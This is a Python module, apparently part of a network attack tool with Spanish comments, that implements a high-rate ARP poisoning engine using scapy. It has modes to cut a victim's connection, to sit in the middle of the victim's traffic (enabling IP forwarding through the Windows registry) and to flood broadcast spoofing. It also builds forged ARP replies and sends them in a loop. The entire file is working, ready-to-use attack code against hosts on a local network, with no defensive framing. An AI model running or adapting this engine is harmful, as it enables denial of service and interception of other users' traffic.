"""
core/arp.py
-----------
Motor de envenenamiento ARP de alta frecuencia.

Optimizaciones clave:
  * Socket L2 abierto UNA sola vez (sin coste de resolucion por paquete).
  * Tramas ARP pre-serializadas a bytes.
  * Pacer de precision con perf_counter + burst configurable.
  * Multi-objetivo atendido por un unico hilo emisor.
  * Restauracion automatica de tablas al desarmar.
"""
from __future__ import annotations

import ctypes
import platform
import threading
import time
from collections import deque
from dataclasses import dataclass, field

from . import netinfo, proc

IS_WIN = platform.system() == "Windows"

CUT = "cut"
MITM = "mitm"
STORM = "storm"


def has_scapy() -> bool:
    try:
        import scapy.all  # noqa
        return True
    except Exception:
        return False


def has_npcap() -> bool:
    if not IS_WIN:
        return True
    try:
        ctypes.windll.LoadLibrary("wpcap.dll")
        return True
    except Exception:
        return False


def enable_ip_forwarding(on: bool = True) -> bool:
    if not IS_WIN:
        return False
    proc.powershell(
        "Set-ItemProperty -Path "
        "'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters' "
        f"-Name IPEnableRouter -Value {1 if on else 0} -Type DWord", timeout=8)
    return True


def get_ip_forwarding() -> bool:
    return proc.powershell(
        "(Get-ItemProperty -Path "
        "'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters' "
        "-Name IPEnableRouter).IPEnableRouter", timeout=6).strip() == "1"


def resolve_mac(ip: str, iface: str | None = None, retries: int = 3) -> str | None:
    try:
        from scapy.all import ARP, Ether, srp
    except Exception:
        return None
    kw = {"timeout": 1.5, "verbose": 0, "retry": retries}
    if iface:
        kw["iface"] = iface
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), **kw)
        for _, r in ans:
            return r[Ether].src.upper()
    except Exception:
        return None
    return None


@dataclass
class Target:
    ip: str
    mac: str
    gw_ip: str
    gw_mac: str
    mode: str = CUT
    frames: list[bytes] = field(default_factory=list)
    sent: int = 0
    since: float = 0.0
    active: bool = True


class ArpEngine:
    """Emisor ARP continuo. Un hilo, N objetivos, cero delays."""

    def __init__(self, iface: str | None = None, log=None):
        self.iface = iface
        self.log = log or (lambda m, l="info": None)
        self.burst = 1
        self.interval = 0.0
        self._sock = None
        self._targets: dict[str, Target] = {}
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None
        self._my_mac: str | None = None
        self._pps: deque[float] = deque(maxlen=8)

    # ---------------------------------------------------------- estado
    @property
    def running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    @property
    def pps(self) -> float:
        return sum(self._pps) / len(self._pps) if self._pps else 0.0

    @property
    def total_sent(self) -> int:
        with self._lock:
            return sum(t.sent for t in self._targets.values())

    def targets(self) -> list[Target]:
        with self._lock:
            return list(self._targets.values())

    def _mac(self) -> str:
        if not self._my_mac:
            self._my_mac = netinfo.get_local_mac()
        return self._my_mac

    # ---------------------------------------------------------- socket
    def _open(self) -> bool:
        if self._sock is not None:
            return True
        try:
            from scapy.all import conf
            self._sock = conf.L2socket(iface=self.iface) if self.iface else conf.L2socket()
            return True
        except Exception as exc:
            self.log(f"L2socket no disponible: {exc}", "error")
            self._sock = None
            return False

    def close(self) -> None:
        self._stop.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=3)
        self._thread = None
        if self._sock is not None:
            try:
                self._sock.close()
            except Exception:
                pass
            self._sock = None

    # ---------------------------------------------------------- armado
    def _frames_for(self, t: Target, my_mac: str) -> list[bytes]:
        from scapy.all import ARP, Ether
        frames = [
            bytes(Ether(src=my_mac, dst=t.mac)
                  / ARP(op=2, hwsrc=my_mac, psrc=t.gw_ip,
                        hwdst=t.mac, pdst=t.ip))
        ]
        if t.mode in (MITM, STORM):
            frames.append(
                bytes(Ether(src=my_mac, dst=t.gw_mac)
                      / ARP(op=2, hwsrc=my_mac, psrc=t.ip,
                            hwdst=t.gw_mac, pdst=t.gw_ip))
            )
        if t.mode == STORM:
            bc = bytes(Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff")
                       / ARP(op=2, hwsrc=my_mac, psrc=t.gw_ip, pdst=t.ip))
            frames.extend([bc] * 6)
        return frames

    def arm(self, target_ip: str, mode: str = CUT, gw_ip: str | None = None,
            burst: int | None = None) -> bool:
        if not has_scapy():
            self.log("scapy ausente: ARP deshabilitado", "error")
            return False
        if IS_WIN and not has_npcap():
            self.log("Npcap no detectado: instala Npcap (modo WinPcap)", "error")
            return False
        if not self._open():
            return False

        gw = gw_ip or netinfo.get_gateway()
        if not gw:
            self.log("Gateway no determinado", "error")
            return False
        if target_ip == gw:
            self.log("La victima no puede ser el gateway", "warn")
            return False

        with self._lock:
            if target_ip in self._targets:
                self.log(f"{target_ip} ya esta envenenado", "warn")
                return True

        my_mac = self._mac()
        t_mac = resolve_mac(target_ip, self.iface)
        g_mac = resolve_mac(gw, self.iface)
        if not t_mac:
            self.log(f"Sin respuesta ARP de {target_ip}", "error")
            return False
        if not g_mac:
            self.log(f"Sin respuesta ARP del gateway {gw}", "error")
            return False

        t = Target(ip=target_ip, mac=t_mac, gw_ip=gw, gw_mac=g_mac,
                   mode=mode, since=time.time())
        t.frames = self._frames_for(t, my_mac)

        with self._lock:
            self._targets[target_ip] = t

        if burst is not None:
            self.burst = max(1, burst)

        if mode in (MITM, STORM) and IS_WIN:
            enable_ip_forwarding(True)

        self.log(f"ARMADO {target_ip} [{mode}] {t_mac} <-> {gw}", "ok")
        self._ensure()
        return True

    def disarm(self, target_ip: str, restore: bool = True) -> None:
        with self._lock:
            t = self._targets.pop(target_ip, None)
        if not t:
            return
        if restore:
            self._restore([t])
        self.log(f"LIBERADO {target_ip}", "warn")
        if not self._targets:
            self.close()

    def disarm_all(self, restore: bool = True) -> None:
        with self._lock:
            pend = list(self._targets.values())
            self._targets.clear()
        if restore and pend:
            self._restore(pend)
        self.close()
        if pend:
            self.log(f"{len(pend)} victima(s) liberada(s)", "warn")

    def set_burst(self, n: int) -> None:
        self.burst = max(1, int(n))

    def set_interval(self, seconds: float) -> None:
        self.interval = max(0.0, float(seconds))

    # ---------------------------------------------------------- hilo
    def _ensure(self) -> None:
        if self.running:
            return
        self._stop.clear()
        self._thread = threading.Thread(target=self._loop, name="ArpEngine", daemon=True)
        self._thread.start()

    def _loop(self) -> None:
        sock = self._sock
        if sock is None:
            return
        last = time.perf_counter()
        while not self._stop.is_set():
            with self._lock:
                targets = [t for t in self._targets.values() if t.active]
            if not targets:
                time.sleep(0.01)
                continue

            count = 0
            for t in targets:
                for f in t.frames:
                    for _ in range(self.burst):
                        try:
                            sock.send(f)
                            count += 1
                        except Exception:
                            pass
                t.sent += len(t.frames)

            now = time.perf_counter()
            dt = now - last
            if dt >= 0.5:
                self._pps.append(count / dt)
                last = now

            if self.interval > 0:
                wait = self.interval - (time.perf_counter() - now)
                if wait > 0:
                    time.sleep(wait)

    def _restore(self, targets: list[Target], rounds: int = 8) -> None:
        try:
            from scapy.all import ARP, Ether, sendp
        except Exception:
            return
        kw = {"verbose": 0}
        if self.iface:
            kw["iface"] = self.iface
        for _ in range(rounds):
            frames = []
            for t in targets:
                frames.append(Ether(dst=t.mac, src=t.gw_mac)
                              / ARP(op=2, psrc=t.gw_ip, pdst=t.ip,
                                    hwsrc=t.gw_mac, hwdst=t.mac))
                frames.append(Ether(dst=t.gw_mac, src=t.mac)
                              / ARP(op=2, psrc=t.ip, pdst=t.gw_ip,
                                    hwsrc=t.mac, hwdst=t.gw_mac))
            try:
                sendp(frames, **kw)
            except Exception:
                pass
            time.sleep(0.12)